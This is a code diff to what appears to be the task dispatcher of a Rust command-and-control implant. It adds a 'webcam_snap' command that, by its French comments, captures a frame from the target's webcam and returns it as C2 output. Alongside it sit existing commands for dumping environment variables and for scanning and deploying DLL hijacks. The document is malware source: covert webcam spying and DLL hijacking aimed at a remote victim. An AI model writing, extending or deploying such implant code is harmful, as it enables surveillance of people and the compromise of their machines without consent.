@@ -20,13 +20,15 @@ pub fn execute(task: &Task, agent_id: &str) -> TaskResult {
         "envdump"    => dump_env(),
         "cd"         => change_directory(payload),
         "pwd"        => print_directory(),
-        "hijack_scan" => hijack_scan(),
+        "hijack_scan"   => hijack_scan(),
         "hijack_deploy" => hijack_deploy(payload),
+        "webcam_snap"   => webcam_snap(),
         _            => (
             String::new(),
             format!("Unknown task type: {}", task.task_type),
             false,
         ),
+
     };
 
     TaskResult {
@@ -256,3 +258,22 @@ fn hijack_deploy(payload: &str) -> (String, String, bool) {
         (String::new(), "Aucune cible de hijacking trouvée pour déployer la DLL.".into(), false)
     }
 }
+
+/// webcam_snap — tente de capturer un frame depuis la webcam de la cible
+///
+/// Utilise Windows Media Foundation (WMF) pour accéder à la webcam
+/// et WIC (Windows Imaging Component) pour encoder le frame en JPEG.
+///
+/// En cas d'échec, retourne une explication détaillée des défenses
+/// Windows qui ont bloqué l'accès (Privacy API, GPO, LED matérielle...).
+fn webcam_snap() -> (String, String, bool) {
+    let result = crate::recon::webcam::try_capture();
+    let output = result.to_c2_output();
+
+    if result.success {
+        (output, String::new(), true)
+    } else {
+        (String::new(), output, false)
+    }
+}
+
